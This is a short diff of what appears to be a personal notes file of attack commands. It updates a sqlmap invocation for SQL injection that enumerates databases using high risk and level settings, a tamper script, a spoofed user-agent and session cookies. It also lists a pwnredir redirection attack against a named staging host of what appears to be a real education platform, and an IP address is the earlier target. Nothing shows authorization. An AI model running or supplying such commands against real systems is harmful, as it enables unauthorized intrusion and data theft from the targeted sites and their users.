@@ -1,6 +1,6 @@
 
 # SQL Injection with sqlmap
-sqlmap -u http://118.98.222.7/article/34 -p param -v3
+sqlmap -r zeroweb.txt --dbs --risk=3 --level=3 --tamper=between --user-agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36" --cookie="JSESSIONID=D1438CD5; username=username; password=password"
 
 # Redirection attack with pwnredir
 python2 pwnredir.py -u https://admin.kampusmerdeka.staging.belajar.id -f payloads.list
